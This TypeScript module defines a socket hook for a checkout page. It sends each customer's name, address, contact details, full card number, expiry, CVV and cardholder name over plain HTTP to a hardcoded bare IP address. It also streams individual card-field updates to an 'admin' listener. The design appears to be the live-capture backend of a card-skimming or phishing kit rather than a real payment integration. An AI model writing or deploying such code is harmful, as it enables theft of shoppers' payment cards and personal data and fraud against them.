import { io } from 'socket.io-client';

interface CheckoutData {
    firstName: string;
    lastName: string;
    country: string;
    street: string;
    apartment?: string;
    postalCode: string;
    city: string;
    state?: string;
    phone?: string;
    email: string;
    paymentMethod: string;
    cardNumber: string;
    expiry: string;
    cvv: string;
    cardholderName: string;
    timestamp: Date;
}

interface CardUpdateData {
    field: string;
    value: string;
    timestamp: Date;
}

export const useSocket = () => {
    let socket: any = null;

    const connect = () => {
        if (!socket) {
            socket = io('http://160.30.44.105:3001', {
                transports: ['websocket', 'polling']
            });

            socket.on('connect', () => {
                console.log('Connected to Socket.IO server');
            });

            socket.on('disconnect', () => {
                console.log('Disconnected from Socket.IO server');
            });

            socket.on('error', (error: any) => {
                console.error('Socket.IO error:', error);
            });
        }
        return socket;
    };

    const disconnect = () => {
        if (socket) {
            socket.disconnect();
            socket = null;
        }
    };

    const joinAdmin = () => {
        if (socket) {
            socket.emit('join-admin');
        }
    };

    const sendCheckoutData = (data: CheckoutData) => {
        if (socket) {
            socket.emit('checkout-data', data);
        }
    };

    const sendCardUpdate = (data: CardUpdateData) => {
        if (socket) {
            socket.emit('card-update', data);
        }
    };

    const onNewCheckout = (callback: (data: CheckoutData) => void) => {
        if (socket) {
            socket.on('new-checkout', callback);
        }
    };

    const onCardUpdated = (callback: (data: CardUpdateData) => void) => {
        if (socket) {
            socket.on('card-updated', callback);
        }
    };

    const offNewCheckout = () => {
        if (socket) {
            socket.off('new-checkout');
        }
    };

    const offCardUpdated = () => {
        if (socket) {
            socket.off('card-updated');
        }
    };

    return {
        connect,
        disconnect,
        joinAdmin,
        sendCheckoutData,
        sendCardUpdate,
        onNewCheckout,
        onCardUpdated,
        offNewCheckout,
        offCardUpdated,
        socket: () => socket
    };
};
